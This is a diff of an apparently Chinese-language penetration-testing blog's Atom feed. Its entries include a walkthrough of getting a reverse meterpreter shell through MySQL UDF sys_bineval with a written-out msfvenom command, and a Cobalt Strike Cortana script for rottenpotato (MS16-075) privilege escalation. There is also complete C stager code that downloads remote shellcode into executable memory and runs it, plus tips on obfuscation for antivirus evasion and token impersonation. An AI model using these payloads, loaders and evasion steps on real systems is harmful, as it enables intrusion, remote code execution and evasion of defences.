@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://life-time.me/"/>
-  <updated>2019-05-22T09:33:50.306Z</updated>
+  <updated>2019-12-13T10:02:55.325Z</updated>
   <id>http://life-time.me/</id>
   
   <author>
@@ -17,11 +17,11 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>udf提权之sys_bineval</title>
+    <title>udf之sys_bineval</title>
     <link href="http://life-time.me/2019/05/21/mysql_udf_sys_bineval/"/>
     <id>http://life-time.me/2019/05/21/mysql_udf_sys_bineval/</id>
     <published>2019-05-21T13:33:51.000Z</published>
-    <updated>2019-05-22T09:33:50.306Z</updated>
+    <updated>2019-12-13T10:02:55.325Z</updated>
     
     <content type="html"><![CDATA[<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>拿到shell，先摸清环境<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">win03+iis6+apache+php+mysql</span><br></pre></td></tr></table></figure></p><p>查看被禁用函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System,exec,passthru</span><br></pre></td></tr></table></figure></p><p>尝试使用未被禁用函数以及调用com，asp等皆无法执行命令</p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>从某个盘的数据库备份文件翻到mysql的root密码，经过尝试发现被降权了，不过能导出udf，进而尝试创建函数执行命令，在使用sys_exec,sys_eval执行命令的时候………mysql炸了，没错，炸了，执行一次炸一次，而且并未成功执行命令<br>目光转向开放端口<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">80</span><br><span class="line">3306</span><br></pre></td></tr></table></figure></p><p>将root开启外连，使用sqlmap -d 进行连接，os-shell尝试执行命令，依然爆炸，将sqlmap的udf丢进winhex查看函数列表，发现有个函数(sys_bineval)可以进行内存加载shellcode，随即定位到sqlmap的os-pwn功能，使用这个功能的时候，首先尝试了几次未成功反弹shell，经过本地测试和实战测试对比并使用 -v 3进行debug，发现实战中os-pwn反弹shell的时候并未调用sys_bineval执行shellcode，本地测试也是偶尔可行(<em>垃圾sqlmap</em>)</p><h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>本地测试debug拿到payload，进行手工构造payload进行反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_http EXITFUNC=thread LPORT=8080 LHOST=172.16.229.139 -a x86 -e x86/alpha_mixed -f raw BufferRegister=EAX &gt; test ;cat test |xxd -c 9999 -ps</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/05/22/V9wcnO.jpg" alt="V9wcnO.jpg"><br>反弹shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Select sys_bineval(0x填这);</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/05/22/V9BseO.jpg" alt="V9BseO.jpg"></p><h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>Ms16-075 getsystem </p>]]></content>
     
@@ -40,41 +40,19 @@
   </entry>
   
   <entry>
-    <title>Cortana-rottenpotato</title>
-    <link href="http://life-time.me/2019/03/05/Cortana-rottenpotato/"/>
-    <id>http://life-time.me/2019/03/05/Cortana-rottenpotato/</id>
-    <published>2019-03-05T14:06:17.000Z</published>
-    <updated>2019-03-06T17:43:42.099Z</updated>
-    
-    <content type="html"><![CDATA[<p>水文…看看就好…<br><a href="https://cobaltstrike.com/aggressor-script/functions.html" target="_blank" rel="noopener">cortana编写手册</a><br><a href="https://github.com/rapid7/metasploit-framework/tree/master/data/exploits/rottenpotato" target="_blank" rel="noopener">rottenpotato.dll</a></p><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p>msf的<a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ms16_075_reflection.rb" target="_blank" rel="noopener">模块</a><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"> if my_target.opts['Arch'] == 'x64'</span><br><span class="line">      dll_file_name = 'rottenpotato.x64.dll'</span><br><span class="line">      vprint_status(<span class="string">"Assigning payload rottenpotato.x64.dll"</span>)</span><br><span class="line">    elsif my_target.opts['Arch'] == 'x86'</span><br><span class="line">      dll_file_name = 'rottenpotato.x86.dll'</span><br><span class="line">      vprint_status(<span class="string">"Assigning payload rottenpotato.x86.dll"</span>)</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      fail_with(Failure::BadConfig, <span class="string">"Unknown target arch; unable to assign exploit code"</span>)</span><br><span class="line">    end</span><br><span class="line">    print_status('Launching notepad to host the exploit...')</span><br><span class="line">    notepad_process = client.sys.process.execute('notepad.exe', nil, 'Hidden' =&gt; true)</span><br><span class="line">    begin</span><br><span class="line">      process = client.sys.process.open(notepad_process.pid, PROCESS_ALL_ACCESS)</span><br><span class="line">      print_good(<span class="string">"Process #&#123;process.pid&#125; launched."</span>)</span><br><span class="line">    rescue Rex::Post::Meterpreter::RequestError</span><br><span class="line">      print_error('Operation failed. Trying to elevate the current process...')</span><br><span class="line">      process = client.sys.process.open</span><br><span class="line">    end</span><br><span class="line">    print_status(<span class="string">"Reflectively injecting the exploit DLL into #&#123;process.pid&#125;..."</span>)</span><br><span class="line">    library_path = ::File.join(Msf::Config.data_directory, <span class="string">"exploits"</span>, <span class="string">"rottenpotato"</span>, dll_file_name)</span><br><span class="line">    library_path = ::File.expand_path(library_path)</span><br><span class="line">    print_status(<span class="string">"Injecting exploit into #&#123;process.pid&#125;..."</span>)</span><br><span class="line">    exploit_mem, offset = inject_dll_into_process(process, library_path)</span><br><span class="line">    print_status(<span class="string">"Exploit injected. Injecting payload into #&#123;process.pid&#125;..."</span>)</span><br><span class="line">    payload_mem = inject_into_process(process, payload.encoded)</span><br><span class="line">    # invoke the exploit, passing in the address of the payload that</span><br><span class="line">    # we want invoked on successful exploitation.</span><br><span class="line">    print_status('Payload injected. Executing exploit...')</span><br><span class="line">    process.thread.create(exploit_mem + offset, payload_mem)</span><br><span class="line">    print_good('Exploit finished, wait for (hopefully privileged) payload execution t+o complete.')</span><br><span class="line">  end</span><br><span class="line">end</span><br></pre></td></tr></table></figure></p><blockquote><p>流程:对应位数选择dll&gt;创建一个notepad进程&gt;将提权dll注入进程&gt;将payload注入进程&gt;调用exp进行提权反弹shell</p></blockquote><h3 id="构造corana"><a href="#构造corana" class="headerlink" title="构造corana"></a>构造corana</h3><p>→_→,手册有给出例子,不过我这还是一段一段的来说,如有不懂,自行看手册</p><ul><li><p>1.首先选择一个listener来生成shellcode</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">btask($<span class="number">1</span>,listener_describe($<span class="number">2</span>));</span><br><span class="line">$stager = shellcode($<span class="number">2</span>, <span class="literal">false</span>, <span class="string">"x64"</span>);</span><br></pre></td></tr></table></figure></li><li><p>2.使用cs提供的反射dll注入选项</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bdllspawn!($<span class="number">1</span>, script_resource(<span class="string">"rottenpotato.x64.dll"</span>), $stager, <span class="string">"ms16-075"</span>, <span class="number">5000</span>);</span><br><span class="line"><span class="comment">//script_resource即Cortana路径</span></span><br></pre></td></tr></table></figure></li><li><p>3.进行连接shell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bstage($<span class="number">1</span>, $null, $<span class="number">2</span>, <span class="string">"x64"</span>);</span><br></pre></td></tr></table></figure></li><li><p>4.再套上模版…</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sub ms16_075_exploit </span><br><span class="line">&#123; </span><br><span class="line">btask($<span class="number">1</span>,listener_describe($<span class="number">2</span>));</span><br><span class="line">$stager = shellcode($<span class="number">2</span>, <span class="literal">false</span>, <span class="string">"x64"</span>);</span><br><span class="line">bdllspawn!($<span class="number">1</span>, script_resource(<span class="string">"rottenpotato.x64.dll"</span>), $stager, <span class="string">"ms16-075"</span>, <span class="number">5000</span>);</span><br><span class="line">bstage($<span class="number">1</span>, $null, $<span class="number">2</span>, <span class="string">"x64"</span>);</span><br><span class="line">&#125; </span><br><span class="line">beacon_exploit_register(<span class="string">"ms16-075"</span>, <span class="string">"test"</span>, &amp;ms16_075_exploit);</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://s2.ax1x.com/2019/03/07/kv7eAS.jpg" alt="kv7eAS.jpg"></p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;水文…看看就好…&lt;br&gt;&lt;a href=&quot;https://cobaltstrike.com/aggressor-script/functions.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;cortana编写手册&lt;/a&gt;&lt;br&gt;&lt;a href=
-      
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
     <title>custom loader</title>
     <link href="http://life-time.me/2019/02/03/custom-loader/"/>
     <id>http://life-time.me/2019/02/03/custom-loader/</id>
     <published>2019-02-03T10:41:39.000Z</published>
-    <updated>2019-02-05T14:46:46.000Z</updated>
+    <updated>2019-12-13T09:44:36.404Z</updated>
     
-    <content type="html"><![CDATA[<p>一个msf和cobalt strike 都可以使用的loader</p><h3 id="了解stager"><a href="#了解stager" class="headerlink" title="了解stager"></a>了解stager</h3><blockquote><p>借用msf的来说，看这 <a href="https://xz.aliyun.com/t/1709/" target="_blank" rel="noopener">https://xz.aliyun.com/t/1709/</a><br>1.连接到处理程序<br>2.读取4字节长度<br>3.分配长度字节缓冲区<br>4.将其标记为可写和可执行（在Windows上，您需要VirtualProtect用于此）<br>5.将长度字节读入该缓冲区<br>6.跳转到缓冲区。在C中执行此操作的最简单方法是将其强制转换为函数指针并调用它。</p></blockquote><p>通俗讲就是建立链接，接收dll，然后反射dll注入</p><blockquote><p>msf与cobalt strike使用Reflective DLL Injection</p></blockquote><h3 id="附上一段https-stager"><a href="#附上一段https-stager" class="headerlink" title="附上一段https stager"></a>附上一段https stager</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">来自：https://github.com/peacand/msf-av-escape/blob/master/reverse_https/main_https.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;wininet.h&gt;</span><br><span class="line"></span><br><span class="line">#define HTTP_OPEN_FLAGS 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000</span><br><span class="line">/*</span><br><span class="line">  ;0x80000000 | ; INTERNET_FLAG_RELOAD</span><br><span class="line">  ;0x04000000 | ; INTERNET_NO_CACHE_WRITE</span><br><span class="line">  ;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION</span><br><span class="line">  ;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT</span><br><span class="line">  ;0x00000200 | ; INTERNET_FLAG_NO_UI</span><br><span class="line">  ;0x00800000 | ; INTERNET_FLAG_SECURE</span><br><span class="line">  ;0x00002000 | ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID</span><br><span class="line">  ;0x00001000   ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#define OPTIONS_SECURITY_FLAGS 0x00003380 </span><br><span class="line">/*</span><br><span class="line">;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID</span><br><span class="line">;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID</span><br><span class="line">;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE</span><br><span class="line">;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA</span><br><span class="line">;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">int main(int argc, char * argv[]) &#123;</span><br><span class="line">char * stage;</span><br><span class="line">void(*stage_main)();</span><br><span class="line">HINTERNET hInternet;</span><br><span class="line">HINTERNET hHttpSession;</span><br><span class="line">HINTERNET hHttpRequest;</span><br><span class="line">int httpflags = OPTIONS_SECURITY_FLAGS;</span><br><span class="line">int recv_tmp = 0, recv_tot = 0;</span><br><span class="line">char *stage_index = NULL;</span><br><span class="line"></span><br><span class="line">/* We dont want the console prompt at screen */</span><br><span class="line">FreeConsole();</span><br><span class="line"></span><br><span class="line">/* Even it its SSL encrypted, lets set a User Agent, looks better :-) */</span><br><span class="line">hInternet = InternetOpen(&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)&quot;, 0, NULL, NULL, 0);</span><br><span class="line">hHttpSession = InternetConnect(hInternet, argv[1], atoi(argv[2]), NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);</span><br><span class="line">/* URL format is *important*, don&apos;t change it ! It tells what kind of payload (Native, Python, Java ..) is going to be injected afterwords */</span><br><span class="line">hHttpRequest = HttpOpenRequest(hHttpSession, &quot;GET&quot;, &quot;/1f7MA&quot;, &quot;HTTP/1.1&quot;, NULL, NULL, HTTP_OPEN_FLAGS, 0);</span><br><span class="line">/* Set SSL options to the HTTP request */</span><br><span class="line">InternetSetOption(hHttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &amp;httpflags, 4);</span><br><span class="line">HttpSendRequest(hHttpRequest, NULL, 0, NULL, 0);</span><br><span class="line"></span><br><span class="line">/* We got the payload, lets allocate a big chunk of memory in RWX to put the whole thing in */</span><br><span class="line">stage = VirtualAlloc(0, 0x00400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">/* Read the payload from the previous http request and put it in our buffer */</span><br><span class="line">recv_tmp = 1;</span><br><span class="line">recv_tot = 0;</span><br><span class="line">stage_index = stage;</span><br><span class="line"></span><br><span class="line">while (recv_tmp &gt; 0) &#123;</span><br><span class="line">InternetReadFile(hHttpRequest, stage_index, 8192, (PDWORD)&amp;recv_tmp);</span><br><span class="line">recv_tot += recv_tmp;</span><br><span class="line">stage_index += recv_tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Just jump at the beginning of the buffer */</span><br><span class="line">stage_main = (void(*)())stage;</span><br><span class="line">stage_main();</span><br><span class="line"></span><br><span class="line">/* We dont have to care about it, but anyway .. */</span><br><span class="line">InternetCloseHandle(hHttpSession);</span><br><span class="line">InternetCloseHandle(hInternet);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自行编译<br>Usage：xxoo.exe ip port<br><img src="https://s2.ax1x.com/2019/02/04/kGL2z8.png" alt=""><br><img src="https://s2.ax1x.com/2019/02/04/kGLGI1.png" alt=""></p><h3 id="什么，你说过不了杀毒？-自己动手做咯，又不难～"><a href="#什么，你说过不了杀毒？-自己动手做咯，又不难～" class="headerlink" title="什么，你说过不了杀毒？ 自己动手做咯，又不难～"></a>什么，你说过不了杀毒？ 自己动手做咯，又不难～</h3>]]></content>
+    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">来自：https://github.com/peacand/msf-av-escape/blob/master/reverse_https/main_https.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">#include &lt;wininet.h&gt;</span><br><span class="line"></span><br><span class="line">#define HTTP_OPEN_FLAGS 0x80000000 | 0x04000000 | 0x00400000 | 0x00200000 | 0x00000200 | 0x00800000 | 0x00002000 | 0x00001000</span><br><span class="line">/*</span><br><span class="line">  ;0x80000000 | ; INTERNET_FLAG_RELOAD</span><br><span class="line">  ;0x04000000 | ; INTERNET_NO_CACHE_WRITE</span><br><span class="line">  ;0x00400000 | ; INTERNET_FLAG_KEEP_CONNECTION</span><br><span class="line">  ;0x00200000 | ; INTERNET_FLAG_NO_AUTO_REDIRECT</span><br><span class="line">  ;0x00000200 | ; INTERNET_FLAG_NO_UI</span><br><span class="line">  ;0x00800000 | ; INTERNET_FLAG_SECURE</span><br><span class="line">  ;0x00002000 | ; INTERNET_FLAG_IGNORE_CERT_DATE_INVALID</span><br><span class="line">  ;0x00001000   ; INTERNET_FLAG_IGNORE_CERT_CN_INVALID</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">#define OPTIONS_SECURITY_FLAGS 0x00003380 </span><br><span class="line">/*</span><br><span class="line">;0x00002000 |        ; SECURITY_FLAG_IGNORE_CERT_DATE_INVALID</span><br><span class="line">;0x00001000 |        ; SECURITY_FLAG_IGNORE_CERT_CN_INVALID</span><br><span class="line">;0x00000200 |        ; SECURITY_FLAG_IGNORE_WRONG_USAGE</span><br><span class="line">;0x00000100 |        ; SECURITY_FLAG_IGNORE_UNKNOWN_CA</span><br><span class="line">;0x00000080          ; SECURITY_FLAG_IGNORE_REVOCATION</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">int main(int argc, char * argv[]) &#123;</span><br><span class="line">char * stage;</span><br><span class="line">void(*stage_main)();</span><br><span class="line">HINTERNET hInternet;</span><br><span class="line">HINTERNET hHttpSession;</span><br><span class="line">HINTERNET hHttpRequest;</span><br><span class="line">int httpflags = OPTIONS_SECURITY_FLAGS;</span><br><span class="line">int recv_tmp = 0, recv_tot = 0;</span><br><span class="line">char *stage_index = NULL;</span><br><span class="line"></span><br><span class="line">/* We dont want the console prompt at screen */</span><br><span class="line">FreeConsole();</span><br><span class="line"></span><br><span class="line">/* Even it its SSL encrypted, lets set a User Agent, looks better :-) */</span><br><span class="line">hInternet = InternetOpen(&quot;User-Agent: Mozilla/4.0 (compatible; MSIE 6.1; Windows NT)&quot;, 0, NULL, NULL, 0);</span><br><span class="line">hHttpSession = InternetConnect(hInternet, argv[1], atoi(argv[2]), NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);</span><br><span class="line">/* URL format is *important*, don&apos;t change it ! It tells what kind of payload (Native, Python, Java ..) is going to be injected afterwords */</span><br><span class="line">hHttpRequest = HttpOpenRequest(hHttpSession, &quot;GET&quot;, &quot;/1f7MA&quot;, &quot;HTTP/1.1&quot;, NULL, NULL, HTTP_OPEN_FLAGS, 0);</span><br><span class="line">/* Set SSL options to the HTTP request */</span><br><span class="line">InternetSetOption(hHttpRequest, INTERNET_OPTION_SECURITY_FLAGS, &amp;httpflags, 4);</span><br><span class="line">HttpSendRequest(hHttpRequest, NULL, 0, NULL, 0);</span><br><span class="line"></span><br><span class="line">/* We got the payload, lets allocate a big chunk of memory in RWX to put the whole thing in */</span><br><span class="line">stage = VirtualAlloc(0, 0x00400000, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line"></span><br><span class="line">/* Read the payload from the previous http request and put it in our buffer */</span><br><span class="line">recv_tmp = 1;</span><br><span class="line">recv_tot = 0;</span><br><span class="line">stage_index = stage;</span><br><span class="line"></span><br><span class="line">while (recv_tmp &gt; 0) &#123;</span><br><span class="line">InternetReadFile(hHttpRequest, stage_index, 8192, (PDWORD)&amp;recv_tmp);</span><br><span class="line">recv_tot += recv_tmp;</span><br><span class="line">stage_index += recv_tmp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/* Just jump at the beginning of the buffer */</span><br><span class="line">stage_main = (void(*)())stage;</span><br><span class="line">stage_main();</span><br><span class="line"></span><br><span class="line">/* We dont have to care about it, but anyway .. */</span><br><span class="line">InternetCloseHandle(hHttpSession);</span><br><span class="line">InternetCloseHandle(hInternet);</span><br><span class="line"></span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自行编译<br>Usage：xxoo.exe ip port<br><img src="https://s2.ax1x.com/2019/02/04/kGL2z8.png" alt=""><br><img src="https://s2.ax1x.com/2019/02/04/kGLGI1.png" alt=""></p><h3 id="什么，你说过不了杀毒？-自己动手做咯，又不难～"><a href="#什么，你说过不了杀毒？-自己动手做咯，又不难～" class="headerlink" title="什么，你说过不了杀毒？ 自己动手做咯，又不难～"></a>什么，你说过不了杀毒？ 自己动手做咯，又不难～</h3>]]></content>
     
     <summary type="html">
     
       
       
-        &lt;p&gt;一个msf和cobalt strike 都可以使用的loader&lt;/p&gt;
-&lt;h3 id=&quot;了解stager&quot;&gt;&lt;a href=&quot;#了解stager&quot; class=&quot;headerlink&quot; title=&quot;了解stager&quot;&gt;&lt;/a&gt;了解stager&lt;/h3&gt;&lt;blockquo
+        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class
       
     
     </summary>
@@ -85,35 +63,11 @@
   </entry>
   
   <entry>
-    <title>cobalt-strike-ms17-010-Cortana</title>
-    <link href="http://life-time.me/2019/01/04/cobalt-strike-ms-17-010/"/>
-    <id>http://life-time.me/2019/01/04/cobalt-strike-ms-17-010/</id>
-    <published>2019-01-04T08:16:49.000Z</published>
-    <updated>2019-01-04T08:30:48.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>根据powershell版的eternalblue脚本写了一个cobalt strike插件</p><p>演示图:<br><img src="https://s2.ax1x.com/2019/01/04/FTau0H.gif" alt=""><br>后期加入批量与listeners选择</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;根据powershell版的eternalblue脚本写了一个cobalt strike插件&lt;/p&gt;
-&lt;p&gt;演示图:&lt;br&gt;&lt;img src=&quot;https://s2.ax1x.com/2019/01/04/FTau0H.gif&quot; alt=&quot;&quot;&gt;&lt;br&gt;后期加入批量与list
-      
-    
-    </summary>
-    
-    
-      <category term="cobalt strike" scheme="http://life-time.me/tags/cobalt-strike/"/>
-    
-  </entry>
-  
-  <entry>
     <title>wmiexec</title>
     <link href="http://life-time.me/2018/09/16/wmiexec/"/>
     <id>http://life-time.me/2018/09/16/wmiexec/</id>
     <published>2018-09-16T11:27:59.000Z</published>
-    <updated>2018-09-16T11:38:08.000Z</updated>
+    <updated>2019-12-13T09:33:07.000Z</updated>
     
     <content type="html"><![CDATA[<p>笔记…..<br>最近搞内网的时候，特别需要用到这类的东西<br>psexec又会留下痕迹，还是用wmiexec吧….<br>地址:<a href="https://www.t00ls.net/viewthread.php?tid=21167" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=21167</a><br>= =混淆一下即可免杀～<br>附上在线混淆地址:<a href="https://isvbscriptdead.com/vbs-obfuscator/" target="_blank" rel="noopener">https://isvbscriptdead.com/vbs-obfuscator/</a></p>]]></content>
     
@@ -130,107 +84,11 @@
   </entry>
   
   <entry>
-    <title>token的利用之降权</title>
-    <link href="http://life-time.me/2018/05/14/token%E4%B8%8E%E9%99%8D%E6%9D%83/"/>
-    <id>http://life-time.me/2018/05/14/token与降权/</id>
-    <published>2018-05-14T09:06:02.000Z</published>
-    <updated>2018-09-26T14:39:28.000Z</updated>
-    
-    <content type="html"><![CDATA[<p>唔，笔记，做个总结….</p><p>当你提权拿到sys的时候，你想看个administrator屏幕啥的或者以这个权限执行啥啥的时候…(sys运行远控弹回来的是黑屏..)</p><p>之前这种我一般是sys弹到msf，迁移进程来降权到administrator执行…..然而…..迁移容易gg(别问为什么，这是个悲伤的事情)</p><p>最近刚好在了解假冒令牌..看到了大佬的<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-Token%E7%AA%83%E5%8F%96%E4%B8%8E%E5%88%A9%E7%94%A8/" target="_blank" rel="noopener">文章</a></p><h3 id="token"><a href="#token" class="headerlink" title="token"></a>token</h3><p>三种方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Windows(incognito.exe)</span><br><span class="line">Powershell(Invoke-TokenManipulation.ps1)</span><br><span class="line">Metasploit(load incognito或者steal_token)</span><br></pre></td></tr></table></figure></p><p>Windwos：<a href="https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip" target="_blank" rel="noopener">https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">incognito.exe list_tokens -u //列出所有token</span><br><span class="line">incognito.exe execute -c &quot;win-xxx\\administrator&quot; cmd.exe</span><br><span class="line">格式:incognito.exe execute [options] &lt;token&gt; &lt;command&gt;</span><br></pre></td></tr></table></figure></p><p>Powershell:<a href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1" target="_blank" rel="noopener">https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-TokenManipulation.ps1</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span 